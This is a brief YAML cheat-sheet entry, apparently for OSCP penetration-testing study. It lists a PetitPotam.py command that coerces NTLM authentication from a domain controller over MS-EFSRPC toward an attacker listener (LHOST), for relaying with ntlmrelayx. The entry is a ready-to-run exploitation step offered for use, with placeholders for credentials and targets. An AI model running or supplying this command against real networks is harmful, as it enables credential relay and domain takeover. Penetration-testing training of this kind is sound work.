---
command: |
  uv run PetitPotam.py -d $DOMAIN -u $USER -p $PASSWORD $LHOST $IP
description: Coerce NTLM authentication from a DC via MS-EFSRPC (pair with ntlmrelayx).
os: [Linux]
category: [oscp, cli]
service: [RPC]
phase: [Exploitation]
references:
  - https://github.com/topotam/PetitPotam
---
